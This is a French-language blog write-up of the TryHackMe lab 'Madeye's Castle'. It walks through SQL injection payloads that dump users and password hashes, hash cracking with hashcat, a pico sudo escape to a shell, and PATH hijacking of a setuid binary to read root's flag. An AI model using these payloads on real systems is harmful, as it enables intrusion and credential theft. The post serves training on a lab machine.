<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>TryHackMe - Madeye&#39;s Castle - Medium :: conflict&#39;s blog</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="Writeup pour la room &#34;Madeye&#39;s Castle&#34;, une room medium sous linux" />
<meta name="keywords" content="infosec writeups" />
<meta name="robots" content="noodp" />
<link rel="canonical" href="/posts/thm-madeyes/" />






  
  
  
  
  
  <link rel="stylesheet" href="/styles.css">







  <link rel="shortcut icon" href="/img/theme-colors/blue.png">
  <link rel="apple-touch-icon" href="/img/theme-colors/blue.png">



<meta name="twitter:card" content="summary" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="TryHackMe - Madeye&#39;s Castle - Medium">
<meta property="og:description" content="Writeup pour la room &#34;Madeye&#39;s Castle&#34;, une room medium sous linux" />
<meta property="og:url" content="/posts/thm-madeyes/" />
<meta property="og:site_name" content="conflict&#39;s blog" />

  
  
  <meta property="og:image" content="/static/img/thm-madeyes/main.jpeg">

<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="627">


  <meta property="article:published_time" content="2022-12-22 00:00:00 &#43;0000 UTC" />












</head>
<body class="blue">


<div class="container center headings--one-size">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="/">
  <div class="logo">
    /home
  </div>
</a>

    </div>
    
      <ul class="menu menu--mobile">
  <li class="menu__trigger">Menu&nbsp;‚ñæ</li>
  <li>
    <ul class="menu__dropdown">
      
        
          <li><a href="/about">/about</a></li>
        
      
        
          <li><a href="/posts-list">/posts-list</a></li>
        
      
      
    </ul>
  </li>
</ul>

    
    
  </div>
  
    <nav class="navigation-menu">
  <ul class="navigation-menu__inner menu--desktop">
    
      
        
          <li><a href="/about">/about</a></li>
        
      
        
          <li><a href="/posts-list">/posts-list</a></li>
        
      
      
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<article class="post">
  <h1 class="post-title">
    <a href="/posts/thm-madeyes/">TryHackMe - Madeye&rsquo;s Castle - Medium</a>
  </h1>
  <div class="post-meta">
    
      <time class="post-date">
        2022-12-22 ::
        
      </time>
    
    
      <span class="post-author">conflict</span>
    
    
  </div>

  
  
  <img src="/static/img/thm-madeyes/main.jpeg"
    class="post-cover"
    alt="TryHackMe - Madeye&#39;s Castle - Medium"
    title="Cover Image" />


  

  <div class="post-content"><div>
        <h1 id="madeyes-castlethm">madeyes-castle.thm<a href="#madeyes-castlethm" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<ul>
<li>Difficulty: Medium</li>
<li>OS: Linux</li>
<li>Description: <code>A boot2root box that is modified from a box used in CuCTF by the team at Runcode.ninja</code></li>
<li>Link: <a href="https://tryhackme.com/room/madeyescastle">https://tryhackme.com/room/madeyescastle</a></li>
</ul>
<h1 id="recon">Recon<a href="#recon" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p><code>‚å®Ô∏è nmap -A madeye.thm</code></p>
<p><code>‚å®Ô∏è dirb http://madeye.thm</code></p>
<p>En attendant qu‚Äôils se terminent, je me rend sur le site:</p>
<p><img src="https://user-images.githubusercontent.com/77807503/207130778-2e336c40-1d08-47b3-ae7c-c6909c5ca3cb.png" alt="2022-12-12-063059_930x1026_scrot"></p>
<p>Page apache par d√©faut, rien de vraiment utile, j‚Äôouvre le dev tools pour √™tre sur qu‚Äôil n‚Äôy a rien d‚Äôintr√©ssant dans le code</p>
<p>Et je vois ceci dans le HTML:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- TODO: Virtual hosting is good. 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">TODO: Register for hogwartz-castle.thm --&gt;</span>
</span></span></code></pre></div><p>Je garde √ßa de c√¥t√©, mais a priori si j‚Äôacc√®de au site depuis <strong>hogwartz-castle.thm</strong>, j‚Äôaurai une page diff√©rence</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>PORT    STATE SERVICE     VERSION
</span></span><span style="display:flex;"><span>22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
</span></span><span style="display:flex;"><span>| ssh-hostkey: 
</span></span><span style="display:flex;"><span>|   2048 7f:5f:48:fa:3d:3e:e6:9c:23:94:33:d1:8d:22:b4:7a (RSA)
</span></span><span style="display:flex;"><span>|   256 53:75:a7:4a:a8:aa:46:66:6a:12:8c:cd:c2:6f:39:aa (ECDSA)
</span></span><span style="display:flex;"><span>|_  256 7f:c2:2f:3d:64:d9:0a:50:74:60:36:03:98:00:75:98 (ED25519)
</span></span><span style="display:flex;"><span>80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.29 (Ubuntu)
</span></span><span style="display:flex;"><span>|_http-title: Apache2 Ubuntu Default Page: Amazingly It works
</span></span><span style="display:flex;"><span>139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
</span></span><span style="display:flex;"><span>445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
</span></span><span style="display:flex;"><span>Service Info: Host: HOGWARTZ-CASTLE; OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span></code></pre></div><p>Le scan nmap montre qu‚Äôil y a un serveur smb, je vais m‚Äôy connecter et voir ce que je peux r√©cup√©rer dessus</p>
<p><code>‚å®Ô∏è smbclient -L //madeye.thm/</code></p>
<p>Le seul dossier accessible est le dossier <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>sambashare</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong>, je vais dedans et je r√©cup√®re les deux fichiers</p>
<p><img src="https://user-images.githubusercontent.com/77807503/207130825-a3e8248f-aa3b-4bfd-8fe6-e52cf73ea16f.png" alt="2022-12-12-063626_930x1026_scrot"></p>
<p>Le spellnames.txt est une liste de noms d‚Äôutilisateurs, et le notes.txt contient ceci:</p>
<blockquote>
<p>Hagrid told me that spells names are not good since they will not &ldquo;rock you&rdquo;
Hermonine loves historical text editors along with reading old books.</p>
</blockquote>
<p>Je devine assez facilement qu‚Äôil veut dire que ‚Äúrockyou‚Äù ne fonctionnera pas, et que donc il ne faut pas essayer de bruteforce le ssh</p>
<p>J‚Äô√©dite mon <strong>/etc/hosts</strong> pour changer le nom de domaine et acc√©der √† l‚Äôautre page</p>
<p><img src="https://user-images.githubusercontent.com/77807503/207130898-ac1dc1a8-bf67-417b-b27a-3c86ac3cd5be.png" alt="2022-12-12-063959_930x1026_scrot"></p>
<p>Je m‚Äôy rends, et je tombe sur ceci:</p>
<p><img src="https://user-images.githubusercontent.com/77807503/207130917-f1d0f74d-3631-4486-a692-bcbbb1fda96e.png" alt="2022-12-12-064102_930x1026_scrot"></p>
<h1 id="sql-injection">SQL Injection<a href="#sql-injection" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>Je tente une injection SQL classique:</p>
<ul>
<li>Username: admin‚Äô or 1=1‚Äî -</li>
<li>password: a</li>
</ul>
<p>et le site m‚Äôaffiche ceci‚Ä¶</p>
<p><img src="https://user-images.githubusercontent.com/77807503/207130935-29238dc9-6842-42e2-af16-cbee59a3ee3c.png" alt="2022-12-12-064226_930x1026_scrot"></p>
<p>Je sais donc qu‚Äôil est vuln√©rable aux injections SQL, mais visiblement on ne peut pas contourner le login avec</p>
<p>Je tente une SQLi UNION BASED, je ne vais pas d√©tailler les √©tapes pour cause de flemme mais voil√†</p>
<p><strong>admin&rsquo; UNION SELECT NULL,NULL,NULL,NULL&ndash; -</strong></p>
<p>‚Üí error&quot;The password for None is incorrect! None&quot;</p>
<p><strong>admin&rsquo; UNION SELECT &ldquo;a&rdquo;,&ldquo;b&rdquo;,&ldquo;c&rdquo;,&ldquo;d&rdquo;&ndash; -</strong></p>
<p>‚Üí error&quot;The password for a is incorrect! d&quot;</p>
<p><strong>admin&rsquo;UNION SELECT NULL,NULL,NULL,sqlite_version()&ndash; -</strong></p>
<p>‚Üí error&quot;The password for None is incorrect! 3.22.0&quot;</p>
<p><strong>admin&rsquo;UNION SELECT NULL,NULL,NULL,sql FROM sqlite_master&ndash; -</strong></p>
<p>‚Üí error&quot;The password for None is incorrect! CREATE TABLE users(\nname text not null,\npassword text not null,\nadmin int not null,\nnotes text not null)&quot;</p>
<p>J‚Äôai les colonnes de la table users:</p>
<p><strong>name, password, admin, notes</strong></p>
<p>Je vais dump <strong><strong><strong><strong><strong><strong><strong><strong>password</strong></strong></strong></strong></strong></strong></strong></strong> et <strong><strong><strong><strong><strong>notes</strong></strong></strong></strong></strong></p>
<p><strong>admin&rsquo;UNION SELECT group_concat(notes,&quot; &ndash; &ldquo;),NULL,NULL,NULL FROM users &ndash; -</strong></p>
<p>Toutes les notes sont similaires sauf la deuxi√®me, qui donne un indice sur le nom d‚Äôutilisateur et le mot de passe</p>
<pre tabindex="0"><code>üí° My linux username is my first name, and password uses best64
</code></pre><p>En r√©cup√©rant la liste des utilisateurs avec la m√™me commande (remplace ‚Äúnotes‚Äù par ‚Äúname‚Äù), je vois que le deuxi√®me utilisateur est Harry</p>
<p>Je r√©cup√®re son mot de passe (toujours le m√™me payload, mais on remplace ‚Äúnotes‚Äù par ‚Äúpassword‚Äù), puis j‚Äôutilise hashid pour savoir de quel type de hash il s‚Äôagit</p>
<p><code>‚å®Ô∏è hashid b326e7a664d756c39c9e09a98438b08226f98b89188ad144dd655f140674b5eb3fdac0f19bb3903be1f52c40c252c0e7ea7f5050dec63cf3c85290c0a2c5c885</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] SHA<span style="color:#f92672">-</span><span style="color:#ae81ff">512</span> 
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] Whirlpool 
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] Salsa10 
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] Salsa20 
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] SHA3<span style="color:#f92672">-</span><span style="color:#ae81ff">512</span> 
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] Skein<span style="color:#f92672">-</span><span style="color:#ae81ff">512</span> 
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] Skein<span style="color:#f92672">-</span><span style="color:#ae81ff">1024</span>(<span style="color:#ae81ff">512</span>)
</span></span></code></pre></div><p>C‚Äôest donc √† priori du SHA-512, je lance donc hashcat en mode SHA-512, <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>avec la rule best64</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p>
<p><code>‚å®Ô∏è hashcat -m 1700 password.hash -r /usr/share/hashcat/rules/best64.rule /home/conflict/wordlists/rockyou.txt</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>b326e7a664d756c39c9e09a98438b08226f98b89188ad144dd655f140674b5eb3fdac0f19bb3903be1f52c40c252c0e7ea7f5050dec63cf3c85290c0a2c5c885:wingardiumleviosa123
</span></span></code></pre></div><p>J‚Äôai donc le mot de passe de <strong>harry</strong></p>
<p>Je me connecte au ssh avec ce mot de passe</p>
<p><img src="https://user-images.githubusercontent.com/77807503/207131371-97507cfb-d204-4300-bff4-01cfbff5923c.png" alt="2022-12-12-192655_1888x1032_scrot"></p>
<h1 id="privesc">Privesc<a href="#privesc" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p><code>‚å®Ô∏è sudo -l</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> harry on hogwartz<span style="color:#f92672">-</span>castle:
</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, secure_path<span style="color:#f92672">=/</span>usr<span style="color:#f92672">/</span>local<span style="color:#f92672">/</span>sbin\:<span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>local<span style="color:#f92672">/</span>bin\:<span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>sbin\:<span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin\:<span style="color:#f92672">/</span>sbin\:<span style="color:#f92672">/</span>bin\:<span style="color:#f92672">/</span>snap<span style="color:#f92672">/</span>bin
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>User harry may run the following commands on hogwartz<span style="color:#f92672">-</span>castle:
</span></span><span style="display:flex;"><span>    (hermonine) <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>pico
</span></span><span style="display:flex;"><span>    (hermonine) <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>pico
</span></span></code></pre></div><p>Je vois que je peux donc utiliser le binaire <strong><strong><strong><strong>pico</strong></strong></strong></strong> en tant que <strong><strong><strong><strong><strong><strong><strong><strong><strong>hermonine</strong></strong></strong></strong></strong></strong></strong></strong></strong></p>
<p>‚Üí <a href="https://gtfobins.github.io/gtfobins/pico/">GTFObins</a></p>
<p>J‚Äôutilise ce payload:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>sudo <span style="color:#f92672">-</span>u hermonine pico
</span></span><span style="display:flex;"><span><span style="color:#f92672">^</span>R<span style="color:#f92672">^</span>X
</span></span><span style="display:flex;"><span>reset; sh <span style="color:#ae81ff">1</span><span style="color:#f92672">&gt;&amp;</span><span style="color:#ae81ff">0</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">&gt;&amp;</span><span style="color:#ae81ff">0</span>
</span></span></code></pre></div><p><img src="https://user-images.githubusercontent.com/77807503/207131441-1ff199bd-8aab-45a9-b0af-dc0efe7d3a2a.png" alt="2022-12-12-193417_1888x1032_scrot"></p>
<p>Le shell n‚Äôest pas stable du tout, donc j‚Äôajoute ma cl√© ssh dans <strong><strong><strong><strong><strong><strong><strong>~/.ssh/authorized_keys</strong></strong></strong></strong></strong></strong></strong></p>
<p>Puis je me connecte en ssh au compte <strong><strong><strong><strong><strong><strong><strong><strong><strong>hermonine</strong></strong></strong></strong></strong></strong></strong></strong></strong></p>
<p><img src="https://user-images.githubusercontent.com/77807503/207131645-84b41c3d-75d4-437e-abb4-8b60a4fe633f.png" alt="2022-12-12-193613_1920x1080_scrot"></p>
<p>Puisque je n‚Äôai pas le password de hermonine, je ne peux pas utiliser <strong><strong><strong><strong><strong><strong><strong>sudo -l</strong></strong></strong></strong></strong></strong></strong>, je liste donc les fichiers ayant le <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>setuid bit</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p>
<p><code>‚å®Ô∏è find / -user root -perm -4000 -exec ls -ldb {} \; &gt;/tmp/filename</code></p>
<p><code>‚å®Ô∏è cat /tmp/filename</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">8816</span> Nov <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2020</span> <span style="color:#f92672">/</span>srv<span style="color:#f92672">/</span>time<span style="color:#f92672">-</span>turner<span style="color:#f92672">/</span>swagger
</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">149080</span> Sep <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2020</span> <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>sudo
</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">22520</span> Mar <span style="color:#ae81ff">27</span>  <span style="color:#ae81ff">2019</span> <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>pkexec
</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">44528</span> Mar <span style="color:#ae81ff">22</span>  <span style="color:#ae81ff">2019</span> <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>chsh
</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">76496</span> Mar <span style="color:#ae81ff">22</span>  <span style="color:#ae81ff">2019</span> <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>chfn
</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">37136</span> Mar <span style="color:#ae81ff">22</span>  <span style="color:#ae81ff">2019</span> <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>newuidmap
</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">18448</span> Jun <span style="color:#ae81ff">28</span>  <span style="color:#ae81ff">2019</span> <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>traceroute6<span style="color:#f92672">.</span>iputils
</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">37136</span> Mar <span style="color:#ae81ff">22</span>  <span style="color:#ae81ff">2019</span> <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>newgidmap
</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">59640</span> Mar <span style="color:#ae81ff">22</span>  <span style="color:#ae81ff">2019</span> <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>passwd
</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">75824</span> Mar <span style="color:#ae81ff">22</span>  <span style="color:#ae81ff">2019</span> <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>gpasswd
</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">40344</span> Mar <span style="color:#ae81ff">22</span>  <span style="color:#ae81ff">2019</span> <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>newgrp
</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">100760</span> Nov <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2018</span> <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>lib<span style="color:#f92672">/</span>x86_64<span style="color:#f92672">-</span>linux<span style="color:#f92672">-</span>gnu<span style="color:#f92672">/</span>lxc<span style="color:#f92672">/</span>lxc<span style="color:#f92672">-</span>user<span style="color:#f92672">-</span>nic
</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">14328</span> Mar <span style="color:#ae81ff">27</span>  <span style="color:#ae81ff">2019</span> <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>lib<span style="color:#f92672">/</span>policykit<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">/</span>polkit<span style="color:#f92672">-</span>agent<span style="color:#f92672">-</span>helper<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">--</span> <span style="color:#ae81ff">1</span> root messagebus <span style="color:#ae81ff">42992</span> Jun <span style="color:#ae81ff">11</span>  <span style="color:#ae81ff">2020</span> <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>lib<span style="color:#f92672">/</span>dbus<span style="color:#f92672">-</span><span style="color:#ae81ff">1.0</span><span style="color:#f92672">/</span>dbus<span style="color:#f92672">-</span>daemon<span style="color:#f92672">-</span>launch<span style="color:#f92672">-</span>helper
</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">10232</span> Mar <span style="color:#ae81ff">28</span>  <span style="color:#ae81ff">2017</span> <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>lib<span style="color:#f92672">/</span>eject<span style="color:#f92672">/</span>dmcrypt<span style="color:#f92672">-</span>get<span style="color:#f92672">-</span>device
</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">113528</span> Oct  <span style="color:#ae81ff">8</span>  <span style="color:#ae81ff">2020</span> <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>lib<span style="color:#f92672">/</span>snapd<span style="color:#f92672">/</span>snap<span style="color:#f92672">-</span>confine
</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">436552</span> Mar  <span style="color:#ae81ff">4</span>  <span style="color:#ae81ff">2019</span> <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>lib<span style="color:#f92672">/</span>openssh<span style="color:#f92672">/</span>ssh<span style="color:#f92672">-</span>keysign
</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">26696</span> Sep <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2020</span> <span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>umount
</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">30800</span> Aug <span style="color:#ae81ff">11</span>  <span style="color:#ae81ff">2016</span> <span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>fusermount
</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">44664</span> Mar <span style="color:#ae81ff">22</span>  <span style="color:#ae81ff">2019</span> <span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>su
</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">64424</span> Jun <span style="color:#ae81ff">28</span>  <span style="color:#ae81ff">2019</span> <span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>ping
</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">43088</span> Sep <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2020</span> <span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>mount
</span></span></code></pre></div><p>Le seul fichier qui sort du lot est le <strong>/srv/time-turner/swagger</strong></p>
<p>Il s‚Äôagit d‚Äôun programme type ‚Äúguess my number‚Äù, tr√®s classique mais surtout tr√®s facile √† bypass</p>
<p><img src="https://user-images.githubusercontent.com/77807503/207131690-3db21737-74f7-42f4-8533-63d046fff34b.png" alt="2022-12-12-194803_1888x1032_scrot"></p>
<p>Pour avoir le bon nombre, j‚Äôutilise ce petit payload:</p>
<p><code>‚å®Ô∏è echo 1 | ./swagger | tr -dc ‚Äò0-9‚Äô | ./swagger</code></p>
<p><img src="https://user-images.githubusercontent.com/77807503/207131709-0111da88-5d39-463f-9f2e-6c6af3f0646e.png" alt="2022-12-12-194924_1888x1032_scrot"></p>
<p>Le tr -dc permet de ne r√©cup√©rer que les chiffres, or, puisqu‚Äôil nous donne le chiffre ‚Äúqu‚Äôil avait choisi‚Äù, on peut directement lui redonner et le chiffre n‚Äôaura pas chang√© puisque les 4 commandes sont faites en parall√®le</p>
<p>Je vois qu‚Äôil me donne l‚Äôarchitecture syst√®me‚Ä¶pas utile</p>
<p>Par contre on peut supposer qu‚Äôil fait appel √† la commande <strong><strong><strong><strong><strong>uname</strong></strong></strong></strong></strong></p>
<p>Je part donc sur une path hijacking, je cr√©e un <strong><strong><strong><strong><strong>uname</strong></strong></strong></strong></strong> dans <strong><strong><strong><strong><strong>/tmp/</strong></strong></strong></strong></strong>, puis je lui donne tout les permissions et je met √† jour le <strong><strong><strong><strong>PATH</strong></strong></strong></strong></p>
<p><code>‚å®Ô∏è echo &quot;cat /root/root.txt&quot; &gt; /tmp/uname</code></p>
<p><code>‚å®Ô∏è chmod +x /tmp/uname</code></p>
<p><code>‚å®Ô∏è export PATH=/tmp:$PATH</code></p>
<p>Maintenant, plus qu‚Äô√† r√©utiliser le payload pour qu‚Äôil fasse appel au <strong><strong><strong><strong><strong>uname</strong></strong></strong></strong></strong>, et normalement le <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>root.txt</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> devrait √™tre lu</p>
<p><img src="https://user-images.githubusercontent.com/77807503/207131741-2b37d8b6-cbca-4cf4-982d-2da93ebdb9e1.png" alt="2022-12-12-195317_1888x1032_scrot"></p>
<p>gg!</p>

      </div></div>

  
    
<div class="pagination">
    <div class="pagination__title">
        <span class="pagination__title-h">Voir d&#39;autres posts</span>
        <hr />
    </div>
    <div class="pagination__buttons">
        
        <span class="button previous">
            <a href="/posts/thm-dogcat/">
                <span class="button__icon">‚Üê</span>
                <span class="button__text">TryHackMe - dogcat - Medium</span>
            </a>
        </span>
        
        
        <span class="button next">
            <a href="/posts/hello/">
                <span class="button__text">Bienvenue !</span>
                <span class="button__icon">‚Üí</span>
            </a>
        </span>
        
    </div>
</div>

  

  
    

  
</article>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright copyright--user">
        <span>/home/rami_malek</span>
    
        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
      </div>
  </div>
</footer>






<script type="text/javascript" src="/bundle.min.js"></script>





  
</div>

</body>
</html>
